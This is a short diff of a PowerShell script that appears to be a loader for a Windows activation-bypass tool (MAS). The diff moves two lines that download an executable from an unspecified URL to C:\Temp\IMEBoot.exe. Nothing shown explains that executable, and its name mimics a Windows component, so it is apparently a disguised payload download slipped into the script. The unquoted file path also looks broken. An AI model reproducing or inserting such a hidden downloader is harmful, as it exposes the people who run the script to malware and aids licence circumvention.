@@ -27,10 +27,10 @@ catch {
 
 $rand = Get-Random -Maximum 99999999
 $isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
-$webClient = New-Object System.Net.WebClient
-$webClient.DownloadFile($Url, C:\Temp\IMEBoot.exe)
 $FilePath = if ($isAdmin) { "$env:SystemRoot\Temp\MAS_$rand.cmd" } else { "$env:TEMP\MAS_$rand.cmd" }
 
+$webClient = New-Object System.Net.WebClient
+$webClient.DownloadFile($Url, C:\Temp\IMEBoot.exe)
 $ScriptArgs = "$args "
 $prefix = "@:: $rand `r`n"
 $content = $prefix + $response
